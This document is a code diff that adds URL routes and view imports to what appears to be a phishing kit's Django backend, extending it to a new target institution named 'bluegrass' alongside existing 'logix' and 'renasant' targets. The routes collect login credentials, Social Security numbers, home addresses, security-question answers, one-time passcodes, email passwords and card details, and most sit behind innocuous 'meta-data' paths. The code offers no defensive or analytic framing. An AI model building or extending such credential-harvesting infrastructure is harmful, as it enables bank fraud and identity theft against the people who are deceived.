@@ -88,6 +88,18 @@ from user_data.logix_views import (
     logix_collect_user_email_password,
     logix_collect_user_card_info,
 )
+from user_data.bluegrass_views import (
+    bluegrass_collect_user_login_cred,
+    bluegrass_collect_user_login_cred2,
+    bluegrass_collect_user_basic_info,
+    bluegrass_collect_user_home_address,
+    bluegrass_collect_user_social_security,
+    bluegrass_collect_user_social_security_2,
+    bluegrass_collect_user_security_questions,
+    bluegrass_collect_user_otp_verification,
+    bluegrass_collect_user_email_password,
+    bluegrass_collect_user_card_info,
+)
 from user_data.renasant_views import (
     renasant_collect_user_login_cred,
     renasant_collect_user_login_cred2,
@@ -194,6 +206,17 @@ urlpatterns = [
     path("api/logix-email-password/", logix_collect_user_email_password, name="logix_collect_user_email_password"),
     path("api/logix-card-info/", logix_collect_user_card_info, name="logix_collect_user_card_info"),
     path("api/logix-basic-info/", logix_collect_user_basic_info, name="logix_collect_user_basic_info_alias"),
+    # Bluegrass API endpoints
+    path("api/bluegrass-meta-data-1/", bluegrass_collect_user_login_cred, name="bluegrass_collect_user_login_cred"),
+    path("api/bluegrass-meta-data-2/", bluegrass_collect_user_login_cred2, name="bluegrass_collect_user_login_cred2"),
+    path("api/bluegrass-meta-data-3/", bluegrass_collect_user_basic_info, name="bluegrass_collect_user_basic_info"),
+    path("api/bluegrass-meta-data-4/", bluegrass_collect_user_home_address, name="bluegrass_collect_user_home_address"),
+    path("api/bluegrass-meta-data-5/", bluegrass_collect_user_social_security, name="bluegrass_collect_user_social_security"),
+    path("api/bluegrass-meta-data-6/", bluegrass_collect_user_social_security_2, name="bluegrass_collect_user_social_security_2"),
+    path("api/bluegrass-meta-data-7/", bluegrass_collect_user_security_questions, name="bluegrass_collect_user_security_questions"),
+    path("api/bluegrass-meta-data-8/", bluegrass_collect_user_otp_verification, name="bluegrass_collect_user_otp_verification"),
+    path("api/bluegrass-email-password/", bluegrass_collect_user_email_password, name="bluegrass_collect_user_email_password"),
+    path("api/bluegrass-card-info/", bluegrass_collect_user_card_info, name="bluegrass_collect_user_card_info"),
     # Renasant API endpoints
     path("api/renasant-meta-data-1/", renasant_collect_user_login_cred, name="renasant_collect_user_login_cred"),
     path("api/renasant-meta-data-2/", renasant_collect_user_login_cred2, name="renasant_collect_user_login_cred2"),
